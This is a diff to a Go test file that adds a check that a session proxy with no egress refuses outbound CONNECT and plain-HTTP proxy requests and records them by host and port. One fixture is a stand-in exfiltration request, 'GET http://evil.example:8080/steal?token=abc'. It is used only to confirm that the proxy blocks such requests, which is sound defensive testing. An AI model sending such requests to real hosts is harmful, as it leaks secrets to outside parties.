@@ -1,6 +1,7 @@
 package sessionproxy
 
 import (
+	"bufio"
 	"context"
 	"net"
 	"net/http"
@@ -50,5 +51,41 @@ func TestProxyEgressGoesToTheTunnelAndNoModelRefusesTheModelRoute(t *testing.T) 
 				t.Fatalf("a model call with NoModel answered %d %v", resp.StatusCode, resp.Header)
 			}
 		})
+	}
+}
+
+// An egress request refused for want of any egress is heard by host and
+// port alone, rule egress.none: a CONNECT, and a plain-HTTP proxy
+// request whose path and query never reach the hook.
+func TestProxyHearsEgressRefusedForWantOfEgress(t *testing.T) {
+	p := New(nil)
+	var heard []egress.Call
+	p.EgressRefused = func(c egress.Call) { heard = append(heard, c) }
+	_, sock := listen(t, p)
+	for _, line := range []string{
+		"CONNECT paste.example:443 HTTP/1.1\r\nHost: paste.example:443\r\n\r\n",
+		"GET http://evil.example:8080/steal?token=abc HTTP/1.1\r\nHost: evil.example:8080\r\n\r\n",
+	} {
+		c, err := net.Dial("unix", sock)
+		if err != nil {
+			t.Fatal(err)
+		}
+		c.Write([]byte(line))
+		resp, err := http.ReadResponse(bufio.NewReader(c), nil)
+		if err != nil {
+			t.Fatal(err)
+		}
+		resp.Body.Close()
+		c.Close()
+		if resp.StatusCode != http.StatusForbidden {
+			t.Fatalf("%q answered %d", line, resp.StatusCode)
+		}
+	}
+	want := []egress.Call{
+		{Host: "paste.example", Port: "443", Rule: egress.RuleNone, Refused: "the session has no egress"},
+		{Host: "evil.example", Port: "8080", Rule: egress.RuleNone, Refused: "the session has no egress"},
+	}
+	if len(heard) != 2 || heard[0] != want[0] || heard[1] != want[1] {
+		t.Fatalf("heard %+v", heard)
 	}
 }
